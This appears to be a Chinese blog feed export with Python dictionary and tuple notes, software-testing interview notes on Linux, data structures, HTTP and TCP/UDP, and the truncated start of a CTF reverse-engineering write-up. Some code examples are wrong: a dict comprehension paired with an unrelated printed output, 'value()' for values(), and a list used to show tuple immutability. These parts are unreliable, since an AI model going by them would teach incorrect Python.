title="获取字典视图的三个方法"></a>获取字典视图的三个方法</h3><ul><li>keys() 获取字典中所有key</li><li>value() 获取字典中所有value</li><li>items() 获取字典中所有key,value对</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score={<span class="hljs-string">'张三'</span>:<span class="hljs-number">100</span>,<span class="hljs-string">'李四'</span>:<span class="hljs-number">98</span>,<span class="hljs-string">'王五'</span>:<span class="hljs-number">45</span>}<br> #获取所有key<br>keys=score<span class="hljs-selector-class">.keys</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(keys)</span></span> <span class="hljs-selector-id">#dict_keys</span>(<span class="hljs-selector-attr">[<span class="hljs-string">'张三'</span>, <span class="hljs-string">'李四'</span>, <span class="hljs-string">'王五'</span>]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list(keys)</span></span>) #<span class="hljs-selector-attr">[<span class="hljs-string">'张三'</span>, <span class="hljs-string">'李四'</span>, <span class="hljs-string">'王五'</span>]</span> 将所有key组成的视图转成列表<br> #获取所有value<br>values=score<span class="hljs-selector-class">.values</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(values)</span></span> <span class="hljs-selector-id">#dict_values</span>(<span class="hljs-selector-attr">[100, 98, 45]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list(values)</span></span>) #<span class="hljs-selector-attr">[100, 98, 45]</span><br> #获取所有键值对<br>items=score<span class="hljs-selector-class">.items</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(items)</span></span> <span class="hljs-selector-id">#dict_items</span>(<span class="hljs-selector-attr">[(<span class="hljs-string">'张三'</span>, 100), (<span class="hljs-string">'李四'</span>, 98), (<span class="hljs-string">'王五'</span>, 45)]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list(items)</span></span>) #<span class="hljs-selector-attr">[(<span class="hljs-string">'张三'</span>, 100), (<span class="hljs-string">'李四'</span>, 98), (<span class="hljs-string">'王五'</span>, 45)]</span><br></code></pre></td></tr></tbody></table></figure><h3 id="元素遍历"><a href="#元素遍历" class="headerlink" title="元素遍历"></a>元素遍历</h3><figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">score={'张三':<span class="hljs-number">100</span>,'李四':<span class="hljs-number">98</span>,'王五':<span class="hljs-number">45</span>}<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">item</span> <span class="hljs-keyword">in</span> score:<br>    print(<span class="hljs-built_in">item</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">item</span> <span class="hljs-keyword">in</span> score:<br>    print(<span class="hljs-built_in">item</span>,score[<span class="hljs-built_in">item</span>],score.<span class="hljs-keyword">get</span>(<span class="hljs-built_in">item</span>))<br> <span class="hljs-comment">#张三 100 100</span><br> <span class="hljs-comment">#李四 98 98</span><br> <span class="hljs-comment">#王五 45 45</span><br></code></pre></td></tr></tbody></table></figure><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>所有元素都是key-value键值对，key不可重复，value可重复</li><li>无序</li><li>key不可变</li><li>字典可动态伸缩</li><li>字典较大浪费内存，是一种使用空间换时间的数据结构</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">d={<span class="hljs-string">'name'</span>:<span class="hljs-string">'张三'</span>,<span class="hljs-string">'name'</span>:<span class="hljs-string">'李四'</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span> #{<span class="hljs-string">'name'</span>: <span class="hljs-string">'李四'</span>}<br>d={<span class="hljs-string">'name'</span>:<span class="hljs-string">'张三'</span>,<span class="hljs-string">'nikename'</span>:<span class="hljs-string">'李四'</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span> #{<span class="hljs-string">'name'</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-string">'nikename'</span>: <span class="hljs-string">'李四'</span>}<br>lst=<span class="hljs-selector-attr">[10,20,30]</span><br>lst<span class="hljs-selector-class">.insert</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lst)</span></span> #<span class="hljs-selector-attr">[10,100,20,30]</span><br></code></pre></td></tr></tbody></table></figure><h3 id="字典生成式"><a href="#字典生成式" class="headerlink" title="字典生成式"></a>字典生成式</h3><p>内置函数zip()</p><p>用于将可迭代对象作为参数，将对象中对应的元素打包成一个元组，然后返回由这些元组组成的列表。</p><pre><code class="hljs">{item.upper() （#这是key）:price(#这是value) for item,price(#自定义变量key,value) in zip(items,prices(#可迭代对象))}</code></pre><p>eg:</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">items=<span class="hljs-selector-attr">[<span class="hljs-string">'Fruits'</span>,<span class="hljs-string">'Books'</span>,<span class="hljs-string">'Others'</span>]</span><br>prices=<span class="hljs-selector-attr">[96,78,85]</span><br>{ item<span class="hljs-selector-class">.upper</span>():price  <span class="hljs-keyword">for</span> item,price <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(items,prices)}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span> #{<span class="hljs-string">'name'</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-string">'nikename'</span>: <span class="hljs-string">'李四'</span>}<br></code></pre></td></tr></tbody></table></figure><h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><p>python内置数据结构之以，不可变序列</p><h2 id="创建-1"><a href="#创建-1" class="headerlink" title="创建"></a>创建</h2><ul><li><code>t=('Python','hello',90)</code></li><li>内置函数tuple() <code>t=tuple(('Python','hello',90))</code></li><li>t=(10,) 单元素要加逗号用以区分</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">t=<span class="hljs-built_in">tuple</span>((<span class="hljs-string">'Python'</span>,<span class="hljs-string">'world'</span>,<span class="hljs-number">90</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t)</span></span> #(<span class="hljs-string">'Python'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-number">90</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(t)</span></span>) #&lt;class <span class="hljs-string">'tuple'</span>&gt;<br>t2=<span class="hljs-string">'Python'</span>,<span class="hljs-string">'world'</span>,<span class="hljs-number">90</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(t2)</span></span>) #&lt;class <span class="hljs-string">'tuple'</span>&gt;<br>t3=(<span class="hljs-string">'Python'</span>,)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(t3)</span></span>) #&lt;class <span class="hljs-string">'tuple'</span>&gt;<br>t1=<span class="hljs-built_in">tuple</span>((<span class="hljs-string">'Python'</span>,<span class="hljs-string">'world'</span>,<span class="hljs-number">90</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t1)</span></span> #(<span class="hljs-string">'Python'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-number">90</span>)<br></code></pre></td></tr></tbody></table></figure><p>空列表、字典、元组</p><figure class="highlight abnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">lst</span><span class="hljs-operator">=</span>[]<br><span class="hljs-attribute">list1</span><span class="hljs-operator">=</span>list()<br><span class="hljs-attribute">d</span><span class="hljs-operator">=</span>{}<br><span class="hljs-attribute">d1</span><span class="hljs-operator">=</span>dict()<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span>()<br><span class="hljs-attribute">t1</span><span class="hljs-operator">=</span>tuple()<br></code></pre></td></tr></tbody></table></figure><h2 id="为何元组不可变"><a href="#为何元组不可变" class="headerlink" title="为何元组不可变"></a>为何元组不可变</h2><p>（1）多任务环境下，同时操作对象时不需要加锁</p><p>（2）元组中存储的是对象的引用：</p><pre><code class="hljs">* 若对象本身不可变，则不能再引用其他对象* 若对象是可变的，则可变对象的引用不允许改变，但数据可以变。</code></pre><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">t=<span class="hljs-selector-attr">[10,[20,30]</span>,<span class="hljs-number">90</span>]<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t)</span></span> #<span class="hljs-selector-attr">[10, [20, 30]</span>, <span class="hljs-number">90</span>]<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(t)</span></span>) #&lt;class <span class="hljs-string">'list'</span>&gt;<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t[<span class="hljs-number">0</span>],type(t[<span class="hljs-number">0</span>])</span></span>,<span class="hljs-built_in">id</span>(t<span class="hljs-selector-attr">[0]</span>)) #<span class="hljs-number">10</span> &lt;class <span class="hljs-string">'int'</span>&gt; <span class="hljs-number">2150843443792</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t[<span class="hljs-number">1</span>],type(t[<span class="hljs-number">1</span>])</span></span>,<span class="hljs-built_in">id</span>(t<span class="hljs-selector-attr">[1]</span>)) #<span class="hljs-selector-attr">[20, 30]</span> &lt;class <span class="hljs-string">'list'</span>&gt; <span class="hljs-number">2150955913664</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t[<span class="hljs-number">2</span>],type(t[<span class="hljs-number">2</span>])</span></span>,<span class="hljs-built_in">id</span>(t<span class="hljs-selector-attr">[2]</span>)) #<span class="hljs-number">90</span> &lt;class <span class="hljs-string">'int'</span>&gt; <span class="hljs-number">2150843634832</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(id(<span class="hljs-number">100</span>)</span></span>) #<span class="hljs-number">2150843635152</span><br> #由于<span class="hljs-selector-attr">[20,30]</span>列表，而列表是可变序列，所以可以向列中添加元素，而列表的内存地址不变<br>t<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.append</span>(<span class="hljs-number">100</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t,id(t[<span class="hljs-number">1</span>])</span></span>) #<span class="hljs-selector-attr">[10, [20, 30, 100]</span>, <span class="hljs-number">90</span>] <span class="hljs-number">2150952344704</span><br></code></pre></td></tr></tbody></table></figure><p>（3）元组遍历</p><p>元组可迭代，用<code>for…in…</code>遍历</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">t=tuple((<span class="hljs-string">'Python'</span>,<span class="hljs-string">'hello'</span>,<span class="hljs-number">90</span>))<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">item</span> <span class="hljs-keyword">in</span> t:<br>    print(<span class="hljs-keyword">item</span>)<br> <span class="hljs-comment">#Python</span><br> <span class="hljs-comment">#hello</span><br> <span class="hljs-comment">#90</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;(啊，最近找工作找的心烦意乱，心浮气躁，都没办法静下心学习了，摆烂了好几天之后深觉不应该如此，无论找工作怎么样子，每天的学习也不应该中断)&lt;/p&gt;
&lt;h1 id=&quot;字典&quot;&gt;&lt;a href=&quot;#字典&quot; class=&quot;headerlink&quot; title=&quot;字典&quot;&gt;&lt;/a&gt;字典&lt;</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>软测面试准备</title>
    <link href="https://sinky.top/2022/09/02/%E8%BD%AF%E6%B5%8B%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    <id>https://sinky.top/2022/09/02/%E8%BD%AF%E6%B5%8B%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/</id>
    <published>2022-09-02T01:34:40.342Z</published>
    <updated>2022-09-02T14:44:04.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本linux命令"><a href="#基本linux命令" class="headerlink" title="基本linux命令"></a>基本linux命令</h1><ul><li>file: 通过探测文件内容判断文件类型，使用权限是所有用户。<ul><li>-v 在标准输出后显示版本信息并退出</li><li>-z 探测压缩过的文件类型</li><li>-L 允许符合连接</li></ul></li><li>mkdir: 建立文件夹，使用权限是所有用户<ul><li>-m 设定权限</li><li>-p 创建上层目录</li><li>-v 创建新目录时显示信息，版本信息</li></ul></li><li>grep: 指定文件中搜索特定的内容，并将含有这些内容的行标准输出。格式：grep 参数<ul><li>-c 只输出匹配行的计数</li><li>-i 不区分大小写（只适用单字符）</li><li>-h 查询多文件时不显示文件名</li><li>-l 查询多文件时只输出包含匹配字符的文件名</li><li>-n 显示匹配及行号</li><li>-s 不显示不存在或无匹配文本的错误信息</li><li>-v 显示不包含匹配文本的所有行</li></ul></li><li>find: 在目录种搜索文件，权限为所有用户，格式：find [path] path指定目录路径，路径列表，互相用空格分离。</li><li>depth: 使用深度级别的查找过程方式，在某层指定目录种优先查找文件内容</li></ul><h1 id="数组和链表的区别及优缺点，如何结合两者优点"><a href="#数组和链表的区别及优缺点，如何结合两者优点" class="headerlink" title="数组和链表的区别及优缺点，如何结合两者优点"></a>数组和链表的区别及优缺点，如何结合两者优点</h1><p>1、数组</p><p>数组是将元素在内存中连续存放，由于每个元素占用内存相同，可以通过下标迅速访问数组中任何元素，但若在数组中增加一个元素，需要移动大量元素，在内存中空出一个元素的空间，然后将要将要增加的元素放入</p><p>2、链表</p><p>链表中的元素在内存中不是顺序存储，而是通过存在元素中的指针联系到一起，每个结点包括两个部分，存储数据元素的数据域，和存储下一个结点地址的指针。</p><p>若要访问链表中的一个元素，需要从第一个元素开始，一直找到需要的元素位置，但增删元素，只需修改元素中的指针即可。</p><p>3、区别</p><ul><li>存储位置：数组逻辑上相邻的元素在物理存储位置上也相邻，但链表不一定</li><li>存储空间：链表存放的内存空间可以连续也可以不连续，但数组是连续的一段内存空间。数组存放相同多的数据数组占用内存较小，但链表还需存放前驱和后继的空间。</li><li>长度可变性：链表长度按实际可伸缩，数组长度是定义固定的。</li><li>按序号查找：数组可随机访问，时间复杂度为O(1)，链表不支持随机访问，平均需要O(n)</li></ul><p>4、哈希表可以结合数组和链表的优点</p><h1 id="测试的相关流程"><a href="#测试的相关流程" class="headerlink" title="测试的相关流程"></a>测试的相关流程</h1><p>需求测试-概要设计测试-详细涉及测试-单元测试-集成测试-系统测试-验收测试</p><h1 id="如何写测试用例"><a href="#如何写测试用例" class="headerlink" title="如何写测试用例"></a>如何写测试用例</h1><p>1、测试员尽早介入，彻底理解清楚需求作为写测试用例的基础</p><p>2、若以前有类似的需求，可以参考类似需求的测试用例，还需要看类似需求的bug情况</p><p>3、清楚输入、输出的各种可能性，以及各种输入的之间的关联关系，理解清楚需求的执行逻辑，通过等价类、边界值、判定表等方法找出大部分用例。</p><p>4、找到需求相关的一些特性，补充测试用例</p><p>5、根据自己的经验分析遗漏的测试场景</p><p>6、多总结类似功能点的测试点</p><p>7、书写格式清晰</p><p>需求分析-需求评审-测试计划与评审-编写测试用例</p><h1 id="测试的常用方法"><a href="#测试的常用方法" class="headerlink" title="测试的常用方法"></a>测试的常用方法</h1><p>(1)黑盒测试方法：</p><p> 黑盒测试也称功能测试或数据驱动测试，它是在已知产品所应具有的功能，通过测试来检测每个功能是否都能正常使用，在测试时，把程序看作一个不能打开的黑盆子，在完全不考虑程序内部结构和内部特性的情况下，测试者在程序接口进行测试，它只检查程序功能是否按照需求规格说明书的规定正常使用，程序是否能适当地接收输入数锯而产生正确的输出信息，并且保持外部信息（如数据库或文件）的完整性。 “黑盒”法着眼于程序外部结构、不考虑内部逻辑结构、针对软件界面和软件功能进行测试。“黑盒”法是穷举输入测试，只有把所有可能的输入都作为测试情况使用，才能以这种方法查出程序中所有的错误。实际上测试情况有无穷多个，因此不仅要测试所有合法的输入，而且还要对那些不合法但是可能的输入进行测试</p><pre><code class="hljs">a)等价类划分法：将程序中所有可能的输入数据划分为若干个等价类，然后从每个部分中选取具有代表性的数据当作测试用例。测试用例由有效等价类和无效等价类的代表数据组成，从而保证测试用例具有完整性和代表性。b)边界值分析法：对程序输入或输出的边界值进行测试（恰好处于边界、或超过边界、或在边界以下的状态）c)因果图法：一种简化逻辑图，能够直观表明输入条件和输出动作之间的因果关系，适合于描述对于多种输入条件组合的测试方法，根据输入条件的组、约束关系和输出条件的因果关系，分析输入条件的各种组合情况，从而设计测试用例的方法，适合于检查程序输入条件的各种组合情况d)错误推测法：基于以往的经验和直觉，参照以往的软件系统出现的错误，推测当前被测程序中可能存在的缺陷和错误，有针对性地设计测试用例，列举出程序中可能犯的错误或容易发生错误的特殊情况的清单，根据清单和已经设计好的测试用例来编写特定的测试用例，站在用户的角度来考虑输入信息，而不必去管这些信息对于被测程序是否是合理的输入。</code></pre><p>(2)白盒测试方法：</p><p>白盒测试也称为结构测试或逻辑驱动测试，是针对被测单元内部是如何进行工作的测试。它根据程序的控制结构设计测试用例，主要用于软件或程序验证。白盒测试法检查程序内部逻辑结构，对所有的逻辑路径进行测试，是一种穷举路径的测试方法，但即使每条路径都测试过了，但仍然有可能存在错误。因为：穷举路径测试无法检查出程序本身是否违反了设计规范，即程序是否是一个错误的程序；穷举路径测试不可能检查出程序因为遗漏路径而出错；穷举路径测试发现不了一些与数据相关的错误。 白盒测试需要遵循的原则有：1. 保证一个模块中的所有独立路径至少被测试一次；2. 所有逻辑值均需要测试真（true）和假（false）；两种情况；3. 检查程序的内部数据结构，保证其结构的有效性；4. 在上下边界及可操作范围内运行所有循环。</p><pre><code class="hljs">a)静态分析：不通过执行程序而进行测试的技术，关键功能是检查软件的表示和描述是否一致，没有冲突或者没有歧义。b)动态分析：其主要特点是当软件系统在模拟的或真实的环境中执行之前、之中和之后，对软件系统行为的分析。动态分析包含了程序在受控的环境下使用特定的期望结果进行正式的运行。它显示了一个系统在检查状态下是正确还是不正确。    i.语句覆盖：顾名思义就是针对代码语句，设计出来的用例要保证程序中的每一个语句至少被执行一次。    ii.分支覆盖：使得程序中每个判断的取真和取假至少经历一次，即判断的真假均曾被满足。    iii.条件覆盖：要求设计用例时针对判断语句里面每个条件表达式true 和 false各取值一次，不考判断语句的计算结果（不考虑组合情况）。    iv.判定条件覆盖：设计测试用例时，使得判断语句中每个条件表达式的所有可能结果至少出现一次，每个判断语句本身所有可能结果也至少出现一次。    v.组合覆盖：设计测试用例时，使得每个判断语句中条件结果的所有可能组合至少出现一次。    vi.路径覆盖：设计测试用例时，覆盖程序中所有可能的执行路径</code></pre><h1 id="说出几种基本的数据结构"><a href="#说出几种基本的数据结构" class="headerlink" title="说出几种基本的数据结构"></a>说出几种基本的数据结构</h1><p>1、链表</p><p>是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。由一系列节点组成，节点不必在内存中相连，每个节点由数据部分Data和链部分Next，Next指向下一个节点，这样当添加或者删除时，只需要改变相关节点的Next的指向，效率很高。</p><p>2、栈和队列</p><p>是比较特殊的线性表，栈是限制插入和删除只能在一个位置上进行的表，后进先出。</p><p>队列只允许在front端进行删除操作，在rear端进行插入操作。</p><p>3、树</p><p>树形结构是一类非常重要的非线性数据结构，考察主要以二叉树为主</p><h1 id="了解什么测试方法"><a href="#了解什么测试方法" class="headerlink" title="了解什么测试方法"></a>了解什么测试方法</h1><p>等价类划分，边界值分析，错误推测，因果图法，逻辑覆盖法，程序插桩技术，基本路径法，符号测试，错误驱动测试</p><h1 id="设计一个微信朋友圈点赞的测试用例"><a href="#设计一个微信朋友圈点赞的测试用例" class="headerlink" title="设计一个微信朋友圈点赞的测试用例"></a>设计一个微信朋友圈点赞的测试用例</h1><p>功能测试：点赞某条朋友圈，验证是否成功</p><p>接口测试：点赞朋友圈，验证朋友能否收到提示信息</p><p>性能测试：点赞朋友圈，是否在规定时间显示结果，是否在规定时间在朋友手机上进行提示</p><p>兼容性测试：在不同的终端手机上点赞朋友圈验证是否成功</p><h1 id="HTTP报文段是什么样的"><a href="#HTTP报文段是什么样的" class="headerlink" title="HTTP报文段是什么样的"></a>HTTP报文段是什么样的</h1><p>http报文是面向文本，每一个字段都是ASCII码串，每个字段长度不确定，</p><p>1、请求报文：</p><p>请求行：request line,由请求方法字段、url字段和http协议版本字段三个字段组成，空格分隔。</p><p>请求方法：</p><ul><li>GET: 要求服务器将url定位的资源放在响应报文的数据部分，回送给客户端，传参长度受限制，请求数据以地址形式表现在请求行。</li><li>POST: 允许客户端向服务器提供较多信息，将请求参数封装在http请求数据中，以名称/值的形式出现，可传输大量数据，也不会显示在url中。</li><li>HEAD: 服务端接受head请求后只返回响应头而不会发送相应内容。</li></ul><p>2、URL</p><p>url: 同意资源定位符，是一种资源位置的抽象唯一识别方法，由子集URL和URN组成，<code>&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;</code></p><p>3、协议版本</p><p>格式为HTTP/主版本号.次版本号，常用为：HTTP/1.1 HTTP/1.0</p><p>4、请求头部</p><ul><li>Host: 接受请求的服务器地址，IP或者域名</li><li>User-Agent：发送请求的应用名称</li><li>Connection: 指定与连接相关的属性</li><li>Accept-Charset: 通知服务器端可以发送的编码格式</li><li>Accept-Encoding: 通知服务器端可以发送的数据压缩格式</li><li>Accept-Language: 通知服务器端可以发送的语言</li></ul><p>请求行：包含请求方式（get、post、put等）、URL，Http协议版本；</p><p>请求头：包含主机host，请求时间，客户端类型、指定客户端接收的数据格式，客户端支持的语言等</p><p>请求体：包含post方法提交的数据，也可以为空； </p><p>响应行：包含状态码、响应信息、Http协议版本； </p><p>响应头：包含响应时间，响应数据的长度、类型、字符编码等</p><p>响应体：包含页面源码；</p><h1 id="压力测试"><a href="#压力测试" class="headerlink" title="压力测试"></a>压力测试</h1><p>对系统不断施加册立，通过确定一个系统的瓶颈或者不能接收的性能点，来获得系统能提供的最大服务级别的测试。</p><h1 id="tcp-udp-区别"><a href="#tcp-udp-区别" class="headerlink" title="tcp udp 区别"></a>tcp udp 区别</h1><p>1、tcp面向连接（先建立连接再发送数据）</p><p>udp无连接，发送数据钱不需要建立连接</p><p>2、tcp安全可靠，传送的数据无差错不丢失不重复且按序到达；</p><p>udp尽最大努力交付，但是不保证可靠交付</p><p>3、tcp面向字节流,把数据看成一连串无结构的字节流;</p><p>UDP是面向报文的，应用层交给UDP多长的报文，UDP就照样发送，即一次发送一个报文</p><p>4、每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信 </p><p>5、TCP的逻辑通信信道是全双工的可靠信道，UDP则是不可靠信道</p><h1 id="介绍一下单元测试、集成测试、系统测试、验收测试、回归测试"><a href="#介绍一下单元测试、集成测试、系统测试、验收测试、回归测试" class="headerlink" title="介绍一下单元测试、集成测试、系统测试、验收测试、回归测试"></a>介绍一下单元测试、集成测试、系统测试、验收测试、回归测试</h1><p>1、单元测试：</p><p>完成最小的软件设计单元（模块）的验证工作，目标是确保模块被正确的编码，使用过程设计描述作为指南，对重要的控制路径进行测试以发现模块内的错误，通常情况下是白盒的，对代码风格和规则、程序设计和结构、业务逻辑等进行静态测试，及早的发现和解决不易显现的错误。 </p><p>2、集成测试：</p><p>通过测试发现与模块接口有关的问题。目标是把通过了单元测试的模块拿来，构造一个在设计中所描述的程序结构，应当避免一次性的集成（除非软件规模很小），而采用增量集成。 自顶向下集成：模块集成的顺序是首先集成主模块，然后按照控制层次结构向下进行集成，隶属于主模块的模块按照深度优先或广度优先的方式集成到整个结构中去。 自底向上集成：从原子模块开始来进行构造和测试，因为模块是自底向上集成的，进行时要求所有隶属于某个给顶层次的模块总是存在的，也不再有使用稳定测试桩的必要。 </p><p>3、系统测试：</p><p>是基于系统整体需求说明书的黑盒类测试，应覆盖系统所有联合的部件。系统测试是针对整个产品系统进行的测试，目的是验证系统是否满足了需求规格的定义，找出与需求规格不相符合或与之矛盾的地方。系统测试的对象不仅仅包括需要测试的产品系统的软件，还要包含软件所依赖的硬件、外设甚至包括某些数据、某些支持软件及其接口等。因此，必须将系统中的软件与各种依赖的资源结合起来，在系统实际运行环境下来进行测试。 </p><p>4、回归测试：</p><p>回归测试是指在发生修改之后重新测试先前的测试用例以保证修改的正确性。理论上，软件产生新版本，都需要进行回归测试，验证以前发现和修复的错误是否在新软件版本上再次出现。根据修复好了的缺陷再重新进行测试。回归测试的目的在于验证以前出现过但已经修复好的缺陷不再重新出现。一般指对某已知修正的缺陷再次围绕它原来出现时的步骤重新测试。 </p><p>5、验收测试：</p><p>验收测试是指系统开发生命周期方法论的一个阶段，这时相关的用户或独立测试人员根据测试计划和结果对系统进行测试和接收。它让系统用户决定是否接收系统。它是一项确定产品是否能够满足合同或用户所规定需求的测试。验收测试包括Alpha测试和Beta测试。 Alpha测试：是由用户在开发者的场所来进行的，在一个受控的环境中进行。 Beta测试：由软件的最终用户在一个或多个用户场所来进行的，开发者通常不在现场，用户记录测试中遇到的问题并报告给开发者，开发者对系统进行最后的修改，并开始准备发布最终的软件。</p><h1 id="tcp的三次握手"><a href="#tcp的三次握手" class="headerlink" title="tcp的三次握手"></a>tcp的三次握手</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基本linux命令&quot;&gt;&lt;a href=&quot;#基本linux命令&quot; class=&quot;headerlink&quot; title=&quot;基本linux命令&quot;&gt;&lt;/a&gt;基本linux命令&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;file: 通过探测文件内容判断文件类型，使用权限是所有用户。&lt;ul&gt;
</summary>
      
    
    
    
    
    <category term="软件测试，面试准备" scheme="https://sinky.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%EF%BC%8C%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界RE-xxxorrr</title>
    <link href="https://sinky.top/2022/08/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-xxxorrr/"/>
    <id>https://sinky.top/2022/08/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-xxxorrr/</id>
    <published>2022-08-19T03:33:52.263Z</published>
    <updated>2022-09-02T14:44:04.932Z</updated>
    
    <content type="html"><![CDATA[<p>xor 异或逻辑运算：相同为0，不同为1</p><p>ida64打开，找到关键字符串<code>Congratulations</code>,点进去查看伪代码</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 <span class="hljs-title">sub_916</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  __int64 v1; <span class="hljs-comment">// [sp+8h] [bp-8h]@1</span><br>  v1 = *<span class="hljs-built_in">MK_FP</span>(__FS__, <span class="hljs-number">40LL</span>);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, s2) )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congratulations!"</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Wrong!"</span>);<br>  <span class="hljs-keyword">return</span> *<span class="hljs-built_in">MK_FP</span>(__FS__, <span class="hljs-number">40LL</span>) ^ v1;<br>}<br></code></pre></td></tr></tbody></table></figure><p>s1与s2相同，返回<code>Congratulations!</code></p><p><img src="https://s2.loli.net/2022/08/19/friaOguYG85KUyh.png" alt="图片.png"></p><p>查看s1,s2值：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s1</span>=qasxcytgsasxcvrefghnrfghnjedfgbhn<br><span class="hljs-attribute">s2</span>= <span class="hljs-number">0</span>x56, <span class="hljs-number">0</span>x4E, <span class="hljs-number">0</span>x57, <span class="hljs-number">0</span>x58, <span class="hljs-number">0</span>x51, <span 